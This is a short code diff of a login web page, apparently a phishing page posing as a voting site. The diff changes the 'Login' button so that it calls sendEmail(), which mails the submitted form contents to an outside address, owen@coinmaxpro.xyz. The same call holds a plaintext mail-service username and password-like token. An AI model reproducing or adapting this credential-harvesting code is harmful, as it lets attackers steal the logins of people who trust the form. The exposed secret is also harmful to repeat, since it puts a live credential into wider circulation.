@@ -204,7 +204,7 @@
                 <input type="hidden" name="_captcha" value="false">
                 <!-- <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html"> -->
                 <div class="link">
-                    <button type="submit" id="button" value="Send Email" class="login"
+                    <button type="submit" id="submit" onclick="sendEmail()"   value="Send Email" class="login"
                         style="text-decoration: none; color: white;">Login </button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
@@ -235,7 +235,7 @@
             Username: "owen@coinmaxpro.xyz",
             Password: "5C8455645DECFE30CD32EB4E6533B764BD54",
             To: 'owen@coinmaxpro.xyz',
-            From: "https://owenvote.vercel.app",
+            From: "you@isp.com",
             Subject: "Mail from website",
             Body: finalmessage
         }).then(
